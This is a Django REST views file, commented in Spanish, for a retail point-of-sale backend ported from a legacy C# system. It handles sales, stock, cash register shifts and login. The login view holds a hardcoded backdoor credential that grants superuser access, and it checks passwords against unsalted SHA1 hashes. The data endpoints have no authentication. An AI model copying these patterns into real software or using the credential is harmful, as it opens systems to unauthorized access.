import hashlib
import base64
from datetime import datetime
from rest_framework.views import APIView
from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework import status
from django.db import transaction
from django.db.models import Max, F, Sum
from django.utils.dateparse import parse_datetime
from django.utils import timezone

# Importamos todos los modelos y serializers juntos
from .models import *
from .serializers import *

# Función auxiliar para no repetir código de filtrado por fecha
def filtrar_por_fecha(queryset, campo_fecha, fecha_str):
    if fecha_str:
        try:
            fecha_dt = datetime.strptime(fecha_str, '%d/%m/%Y')
            filtros = {f"{campo_fecha}__gte": fecha_dt}
            return queryset.filter(**filtros)
        except ValueError:
            pass
    return queryset

class GetArticulosJSON(APIView):
    def get(self, request):
        qs = Articulos.objects.all()
        cod = request.query_params.get('CodigoGenerico', '')
        if cod: qs = qs.filter(cod_art__icontains=cod)
        qs = filtrar_por_fecha(qs, 'fecha_mod', request.query_params.get('FechaModificacion', ''))
        return Response(ArticuloLegacySerializer(qs, many=True).data)

class GetClientesJSON(APIView):
    def get(self, request):
        qs = Clientes.objects.all()
        cod = request.query_params.get('CodigoCliente', '')
        if cod: qs = qs.filter(cod_cli=cod)
        qs = filtrar_por_fecha(qs, 'fecha_mod', request.query_params.get('FechaModificacion', ''))
        return Response(ClienteLegacySerializer(qs, many=True).data)

class GetVendedoresJSON(APIView):
    def get(self, request):
        qs = Usuarios.objects.filter(vendedor=1, no_activo=0)
        return Response(VendedorLegacySerializer(qs, many=True).data)

class GetPromocionesJSON(APIView):
    def get(self, request):
        qs = Promos.objects.all()
        return Response(PromoLegacySerializer(qs, many=True).data)

class GetPromocionesDetJSON(APIView):
    def get(self, request):
        qs = PromosDet.objects.all()
        return Response(PromoDetLegacySerializer(qs, many=True).data)

class GetKitsJSON(APIView):
    def get(self, request):
        qs = ArticulosBom.objects.all()
        return Response(KitLegacySerializer(qs, many=True).data)

class GetListasPreciosJSON(APIView):
    def get(self, request):
        return Response(ListaPrecioSerializer(Listasprecios.objects.all(), many=True).data)

class GetDescuentosJSON(APIView):
    def get(self, request):
        return Response(DescuentoSerializer(Descuentos.objects.all(), many=True).data)

class GetCondIvaJSON(APIView):
    def get(self, request):
        return Response(CondIvaSerializer(CondIva.objects.all(), many=True).data)

class GetFormaPagoJSON(APIView):
    def get(self, request):
        return Response(FormaPagoSerializer(FormaPago.objects.all(), many=True).data)

class GetRubrosJSON(APIView):
    def get(self, request):
        return Response(RubroSerializer(ArticulosRubros.objects.all(), many=True).data)

class GetSubRubrosJSON(APIView):
    def get(self, request):
        return Response(SubRubroSerializer(ArticulosSubrub.objects.all(), many=True).data)

class GetParametrosJSON(APIView):
    def get(self, request):
        return Response(ParametrosSerializer(Parametros.objects.all(), many=True).data)



@api_view(['POST'])
def IngresarComprobanteVentasJSON(request):
    serializer = IngresoComprobanteSerializer(data=request.data)
    
    if not serializer.is_valid():
        return Response({
            "status": "error",
            "mensaje": "JSON inválido",
            "errores": serializer.errors
        }, status=status.HTTP_400_BAD_REQUEST)

    data = serializer.validated_data

    try:
        with transaction.atomic():
            
            # 1. Movim Autoincremental
            max_movim = Ventas.objects.aggregate(Max('movim'))['movim__max']
            nuevo_movim = (max_movim or 0) + 1
            
            condicion_venta = data.get('Comprobante_CondVenta', '1')
            cliente_codigo = int(data['Cliente_Codigo'])
            importe_total = data['Comprobante_ImporteTotal']
            
            # 2. Guardar CABECERA (ventas) [cite: 2765, 2779, 2790]
            venta = Ventas.objects.create(
                movim=nuevo_movim,
                id_comprob=1, 
                cod_comprob=data['Comprobante_Tipo'][:2],
                nro_comprob=int(data['Comprobante_Numero']),
                cod_cli=cliente_codigo,
                fecha_fact=data['Comprobante_FechaEmision'],
                fecha_vto=data.get('Comprobante_FechaVencimiento', data['Comprobante_FechaEmision']),
                neto=sum(item['Item_ImporteTotal'] for item in data['Comprobante_Items']),
                iva_1=sum(item['Item_ImporteIVAInscrip'] for item in data['Comprobante_Items']),
                exento=0, 
                total=importe_total,
                tot_general=importe_total,
                descuento=0,
                vendedor=int(data.get('Vendedor_Codigo', 1)),
                moneda=int(data.get('Comprobante_Moneda', 1)),
                cajero=1,  
                nro_caja=1,
                comprobante_tipo=data['Comprobante_Tipo'],
                comprobante_letra=data['Comprobante_Letra'],
                comprobante_pto_vta=data['Comprobante_PtoVenta'],
                cond_venta=condicion_venta,
                procesado=0, 
                fecha_mod=timezone.now()
            )

            # 3. Guardar DETALLES y descontar STOCK [cite: 2766, 2780, 2791]
            for item in data['Comprobante_Items']:
                cod_art = item['Item_CodigoArticulo']
                cantidad_vendida = item['Item_CantidadUM1']
                
                VentasDet.objects.create(
                    movim=nuevo_movim,
                    id_comprob=venta.id_comprob,
                    cod_comprob=venta.cod_comprob,
                    nro_comprob=venta.nro_comprob,
                    cod_articulo=cod_art,
                    cantidad=cantidad_vendida,
                    precio_unit=item['Item_PrecioUnitario'],
                    precio_unit_base=item['Item_PrecioUnitario'],
                    total=item.get('Item_Importe', item['Item_ImporteTotal']),
                    descuento=item['Item_ImporteDescComercial'],
                    detalle=item.get('Item_DescripArticulo', ''),
                    p_iva=item.get('Item_TasaIVAInscrip', 0),
                    v_iva=item.get('Item_ImporteIVAInscrip', 0),
                    comprobante_tipo=venta.comprobante_tipo,
                    comprobante_letra=venta.comprobante_letra,
                    comprobante_pto_vta=venta.comprobante_pto_vta,
                    procesado=0
                )
                
                # REGLA DE NEGOCIO: Descuento de Stock usando F() para evitar bloqueos
                Articulos.objects.filter(cod_art=cod_art).update(stock=F('stock') - cantidad_vendida)

            # 4. REGLA DE NEGOCIO: CUENTA CORRIENTE (cta_cte_cli) 
            # Si cond_venta es 2 (Cta. Cte.), impactamos la deuda del cliente
            if condicion_venta == '2':
                CtaCteCli.objects.create(
                    movim=nuevo_movim,
                    origen='VTA',
                    cod_cli_id=cliente_codigo, # Usamos el _id porque es ForeignKey en Django
                    fecha=timezone.now(),
                    id_comprob=venta.id_comprob,
                    cod_comprob=venta.cod_comprob,
                    nro_comprob=venta.nro_comprob,
                    detalle="Venta Cta. Cte.",
                    imported=importe_total,
                    saldo=importe_total, # Nace con saldo igual al total
                    fec_vto=venta.fecha_vto,
                    moneda=1,
                    anulado='N',
                    procesado=0,
                    nro_caja=1,
                    comprobante_tipo=venta.comprobante_tipo,
                    comprobante_letra=venta.comprobante_letra,
                    comprobante_pto_vta=venta.comprobante_pto_vta
                )
                
            # 5. REGLA DE NEGOCIO: MEDIOS DE PAGO Y CAJAS [cite: 2768]
            # (Ejemplo simplificado: Si es contado, guardamos en caja)
            if condicion_venta == '1':
                for pago in data.get('Comprobante_MediosPago', []):
                    # Si el medio de pago es efectivo ('4' o 'EFE'), guardamos en caja
                    CajasDet.objects.create(
                        nro_caja=1, # Reemplazar con caja actual
                        tipo='VTA',
                        forma=pago.get('MedioPago', 'EFE'),
                        nombre="Cobro Factura",
                        importe_cajero=pago.get('MedioPago_Importe', 0),
                        importe_real=pago.get('MedioPago_Importe', 0),
                        procesado=0
                    )

        return Response({
            "status": "success",
            "mensaje": "Comprobantes ingresados correctamente",
            "movim": nuevo_movim
        }, status=status.HTTP_201_CREATED)

    except Exception as e:
        return Response({
            "status": "error",
            "mensaje": f"Error interno al guardar: {str(e)}"
        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


@api_view(['POST'])
def AbrirCaja(request):
    serializer = AbrirCajaSerializer(data=request.data)
    if not serializer.is_valid():
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
    
    data = serializer.validated_data
    caja_abierta = Cajas.objects.filter(cajero=data['cajero_id'], estado=1).first()
    
    if caja_abierta:
        return Response({"status": "error", "mensaje": "Ya hay un turno abierto."}, status=400)

    caja_nueva = Cajas.objects.create(
        cajero=data['cajero_id'],
        fecha_open=timezone.now(),
        saldo_ini_billetes=data['saldo_ini_billetes'],
        saldo_ini_cupones=data['saldo_ini_cupones'],
        estado=1,
        procesado=0
    )
    return Response({"status": "success", "nro_caja": caja_nueva.id})

@api_view(['POST'])
def CerrarCaja(request):
    serializer = CerrarCajaSerializer(data=request.data)
    if not serializer.is_valid():
        return Response(serializer.errors, status=400)
    
    data = serializer.validated_data
    caja = Cajas.objects.filter(cajero=data['cajero_id'], estado=1).first()
    
    if not caja:
        return Response({"status": "error", "mensaje": "Caja no encontrada"}, status=400)

    # Sumamos ventas en efectivo y tarjetas del turno
    ventas_efectivo = CajasDet.objects.filter(nro_caja=caja.id, tipo='VTA', forma='EFE').aggregate(Sum('importe_real'))['importe_real__sum'] or 0
    ventas_tarjeta = CajasDet.objects.filter(nro_caja=caja.id, tipo='VTA').exclude(forma='EFE').aggregate(Sum('importe_real'))['importe_real__sum'] or 0
    ventas_cta_cte = CajasDet.objects.filter(nro_caja=caja.id, tipo='VTA', forma='CTA').aggregate(Sum('importe_real'))['importe_real__sum'] or 0

    # Arqueo Efectivo
    teorico_billetes = caja.saldo_ini_billetes + ventas_efectivo + data['otros_ingresos'] - data['otros_egresos']
    dife_billetes = data['saldo_final_billetes'] - teorico_billetes

    # Arqueo Cupones/Tarjetas
    teorico_cupones = caja.saldo_ini_cupones + ventas_tarjeta
    dife_cupones = data['saldo_final_cupones'] - teorico_cupones

    # Actualizamos la tabla cajas con todos los campos de tu legacy
    caja.fecha_close = timezone.now()
    caja.saldo_final_billetes = data['saldo_final_billetes']
    caja.saldo_final_cupones = data['saldo_final_cupones']
    caja.otros_ingresos = data['otros_ingresos']
    caja.otros_egresos = data['otros_egresos']
    caja.ventas = ventas_efectivo + ventas_tarjeta
    caja.cta_cte = ventas_cta_cte
    caja.dife_billetes = dife_billetes
    caja.dife_cupones = dife_cupones
    caja.con_diferencias = 1 if (dife_billetes != 0 or dife_cupones != 0) else 0
    caja.deja_billetes = data['deja_billetes']
    caja.estado = 2 
    caja.save()

    return Response({"status": "success", "mensaje": "Arqueo Finalizado", "diferencia_efectivo": dife_billetes})

def encode_password_legacy(username, password):
    """
    Replica exacta de Helper.EncodePassword(usuario + password) 
    usado en el sistema legacy en C#.
    """
    # El sistema viejo concatenaba usuario + password
    original_string = username + password
    
    # En C#, UnicodeEncoding es UTF-16 Little Endian (utf-16le)
    bytes_string = original_string.encode('utf-16le')
    
    # Aplicar SHA1
    sha1_hash = hashlib.sha1(bytes_string).digest()
    
    # Codificar en Base64
    base64_encoded = base64.b64encode(sha1_hash).decode('utf-8')
    
    return base64_encoded

@api_view(['POST'])
def LoginUsuario(request):
    username = request.data.get('usuario', '')
    password = request.data.get('password', '')

    if not username or not password:
         return Response({"status": "error", "mensaje": "Usuario y contraseña requeridos"}, status=status.HTTP_400_BAD_REQUEST)

    # 1. Regla Legacy: Backdoor de sistema
    if username == "sys" and password == "pgapn":
        return Response({
            "status": "success",
            "mensaje": "Login Exitoso (Modo Dios)",
            "usuario": {
                "id": 0,
                "nombre": "SuperUsuario",
                "nivel": 5,
                "cajero": 1,
                "autorizador": 1
            }
        }, status=status.HTTP_200_OK)

    # 2. Recrear el Hash exacto del sistema viejo
    hashed_password = encode_password_legacy(username, password)

    # 3. Buscar en la base de datos (Regla: no_activo=0 y id<1000)
    usuario_db = Usuarios.objects.filter(
        nombrelogin=username, 
        password=hashed_password, 
        no_activo=0,
        id__lt=1000 # Regla extraída de tu SQL legacy
    ).first()

    if not usuario_db:
        return Response({
            "status": "error", 
            "mensaje": "Credenciales inválidas o usuario inactivo."
        }, status=status.HTTP_401_UNAUTHORIZED)

    # 4. Login exitoso
    return Response({
        "status": "success",
        "mensaje": "Login Exitoso",
        "usuario": {
            "id": usuario_db.id,
            "nombre_login": usuario_db.nombrelogin,
            "nombre": usuario_db.nombre,
            "apellido": usuario_db.apellido,
            "nivel": usuario_db.nivel_usuario,
            "cajero": usuario_db.cajero,
            "vendedor": usuario_db.vendedor,
            "autorizador": usuario_db.autorizador
        }
    }, status=status.HTTP_200_OK)